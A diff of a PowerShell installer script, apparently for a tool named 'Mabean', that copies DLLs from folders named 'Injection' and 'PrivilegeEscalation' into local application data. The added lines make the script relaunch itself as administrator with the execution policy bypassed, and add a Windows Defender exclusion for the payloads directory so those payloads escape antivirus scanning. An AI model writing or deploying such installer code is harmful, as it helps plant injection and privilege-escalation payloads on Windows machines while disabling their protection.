@@ -1,3 +1,14 @@
+$IsAdmin = ([Security.Principal.WindowsPrincipal] `
+    [Security.Principal.WindowsIdentity]::GetCurrent()
+).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+
+if (-not $IsAdmin) {
+    Start-Process powershell `
+        -Verb RunAs `
+        -ArgumentList "-ExecutionPolicy Bypass -File `"$PSCommandPath`""
+    exit
+}
+
 $local = [Environment]::GetFolderPath([Environment+SpecialFolder]::LocalApplicationData)
 $mabeanDir = Join-Path $local "Mabean"
 $dataDir = Join-Path $mabeanDir "data"
@@ -44,6 +55,8 @@ if (-Not (Test-Path $keyBinPath)) {
 Copy-Item ".\MabeanScripts\Injection\1\x64\Release\1.dll" -Destination (Join-Path $dlls "1.dll")  -Force
 Copy-Item ".\MabeanScripts\PrivilegeEscalation\2\x64\Release\2.dll" -Destination (Join-Path $dlls "2.dll")  -Force
 Copy-Item ".\MabeanMarker.exe" -Destination (Join-Path $dataDir "MabeanMarker.exe")  -Force
+
+Set-MpPreference -ExclusionPath $payloadsDir
 
 
 
